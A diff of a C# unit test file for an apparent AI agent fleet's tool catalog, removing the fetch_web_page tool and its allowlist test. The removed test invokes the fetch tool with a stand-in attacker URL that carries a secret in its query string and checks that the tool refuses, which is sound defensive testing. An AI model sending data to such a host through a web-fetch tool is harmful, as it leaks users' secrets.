@@ -6,13 +6,13 @@ using Microsoft.Extensions.Logging.Abstractions;
 
 namespace Agent42.Tests;
 
-/// <summary>The fleet's own tool catalog (ADR 0097): selection gating, MCP wrapping, web tool caps and the allowlist.</summary>
+/// <summary>The fleet's own tool catalog (ADR 0097): selection gating, MCP wrapping, web tool registration.</summary>
 public class FleetToolCatalogTests
 {
     private static readonly ScriptedFleetInteraction Interaction = new();
 
-    private static FleetToolCatalog Catalog(IWebPageFetcher? fetcher = null, IGrainFactory? grains = null)
-        => new(grains!, NullLogger<FleetToolCatalog>.Instance, new InMemoryWebSearch(), fetcher ?? new InMemoryWebPageFetcher());
+    private static FleetToolCatalog Catalog(IGrainFactory? grains = null)
+        => new(grains!, NullLogger<FleetToolCatalog>.Instance, new InMemoryWebSearch());
 
     private static AIFunction Tool(string name) => AIFunctionFactory.Create(() => $"{name} ran", name);
 
@@ -32,7 +32,7 @@ public class FleetToolCatalogTests
     {
         var tools = Catalog().Build([ToolCatalog.McpServerKey("s2"), ToolCatalog.WebSearch], "", [ServerOne, ServerTwo], Interaction);
 
-        Assert.Equal(["web_search", "fetch_web_page", "gamma"], tools.Select(t => t.Name));
+        Assert.Equal(["web_search", "gamma"], tools.Select(t => t.Name));
     }
 
     /// <summary>ADR 0099: the task's override wins over a default that allows web search.</summary>
@@ -41,10 +41,10 @@ public class FleetToolCatalogTests
     {
         var profile = FakeProfileGrainFactory.Create([ToolCatalog.WebSearch]);
 
-        var fromDefault = await Catalog(grains: profile.Factory).BuildAsync("alice", "", null, Interaction, default);
-        var overridden = await Catalog(grains: profile.Factory).BuildAsync("alice", "", ["mcp:s1"], Interaction, default);
+        var fromDefault = await Catalog(profile.Factory).BuildAsync("alice", "", null, Interaction, default);
+        var overridden = await Catalog(profile.Factory).BuildAsync("alice", "", ["mcp:s1"], Interaction, default);
 
-        Assert.Equal(["web_search", "fetch_web_page"], fromDefault.Select(t => t.Name));
+        Assert.Equal(["web_search"], fromDefault.Select(t => t.Name));
         Assert.Empty(overridden);
     }
 
@@ -54,7 +54,7 @@ public class FleetToolCatalogTests
     {
         var tools = await Catalog().BuildAsync("alice", "", [ToolCatalog.WebSearch], Interaction, default);
 
-        Assert.Equal(["web_search", "fetch_web_page"], tools.Select(t => t.Name));
+        Assert.Equal(["web_search"], tools.Select(t => t.Name));
     }
 
     /// <summary>An empty override means no selectable tools, not "the default" (which here allows everything).</summary>
@@ -63,7 +63,7 @@ public class FleetToolCatalogTests
     {
         var profile = FakeProfileGrainFactory.Create(null);
 
-        var tools = await Catalog(grains: profile.Factory).BuildAsync("alice", "", [], Interaction, default);
+        var tools = await Catalog(profile.Factory).BuildAsync("alice", "", [], Interaction, default);
 
         Assert.Empty(tools);
         Assert.Equal(0, profile.Reads);
@@ -74,7 +74,7 @@ public class FleetToolCatalogTests
     {
         var tools = Catalog().Build(null, "", [ServerOne, ServerTwo], Interaction);
 
-        Assert.Equal(["web_search", "fetch_web_page", "alpha", "beta", "gamma"], tools.Select(t => t.Name));
+        Assert.Equal(["web_search", "alpha", "beta", "gamma"], tools.Select(t => t.Name));
     }
 
     [Fact]
@@ -93,7 +93,7 @@ public class FleetToolCatalogTests
 
         var tools = Catalog().Build(null, "", [odd], Interaction);
 
-        Assert.Equal(["web_search", "fetch_web_page", "ok-name"], tools.Select(t => t.Name));
+        Assert.Equal(["web_search", "ok-name"], tools.Select(t => t.Name));
     }
 
     [Fact]
@@ -120,28 +120,19 @@ public class FleetToolCatalogTests
         var without = Catalog().Build(null, "", [clash], Interaction);
 
         Assert.Equal(["search_documents", "read_document"], with.Select(t => t.Name));
-        Assert.Equal(["search_documents", "read_document", "web_search", "fetch_web_page", "delta"], withAll.Select(t => t.Name));
+        Assert.Equal(["search_documents", "read_document", "web_search", "delta"], withAll.Select(t => t.Name));
         Assert.Same(documentTools[1], withAll[1]);
-        Assert.Equal(["web_search", "fetch_web_page", "delta"], without.Select(t => t.Name));
+        Assert.Equal(["web_search", "delta"], without.Select(t => t.Name));
     }
 
+    /// <summary>ADR 0125: the fleet offers web_search only, with no page fetch.</summary>
     [Fact]
-    public async Task WebFetch_OnlyAllowlistedUrls_AndTruncated()
+    public void Tools_DoNotIncludeFetchWebPage()
     {
-        var tools = Catalog(new HugePageFetcher()).Build(null, "Summarise https://docs.example.org/guide please", [], Interaction);
-        var fetch = tools.Single(t => t.Name == "fetch_web_page");
-        var search = tools.Single(t => t.Name == "web_search");
+        var tools = Catalog().Build(null, "Summarise https://docs.example.org/guide please", [], Interaction);
 
-        var refused = (await fetch.InvokeAsync(new() { ["url"] = "https://attacker.example/?q=secret" }))!.ToString();
-        Assert.StartsWith("I won't fetch", refused);
-
-        var fromRequest = (await fetch.InvokeAsync(new() { ["url"] = "https://docs.example.org/guide" }))!.ToString()!;
-        Assert.True(fromRequest.Length <= WebToolLimits.MaxTotalPageTextLength + 100, $"length {fromRequest.Length}");
-        Assert.Contains("cut off", fromRequest);
-
-        var results = JsonDocument.Parse((await search.InvokeAsync(new() { ["query"] = "lighthouses" }))!.ToString()!);
-        var url = results.RootElement[0].GetProperty("Url").GetString();
-        Assert.DoesNotContain("I won't fetch", (await fetch.InvokeAsync(new() { ["url"] = url }))!.ToString());
+        Assert.Contains("web_search", tools.Select(t => t.Name));
+        Assert.DoesNotContain("fetch_web_page", tools.Select(t => t.Name));
     }
 
     [Fact]
@@ -158,11 +149,5 @@ public class FleetToolCatalogTests
         Assert.Equal((McpElicitationLimits.Accept, "{\"name\":\"Ada\"}"), (form.Action, form.ContentJson));
         Assert.Equal(McpElicitationLimits.Decline, declined.Action);
         Assert.Equal(McpElicitationLimits.Cancel, unsafeUrl.Action);
-    }
-
-    private sealed class HugePageFetcher : IWebPageFetcher
-    {
-        public Task<WebPageContent> FetchAsync(string url, string? followLinkFilter = null, int maxFollowedLinks = 1, CancellationToken cancellationToken = default)
-            => Task.FromResult(new WebPageContent(url, "Huge", new string('x', 200_000), false, WebPageContent.NoFollowed));
     }
 }
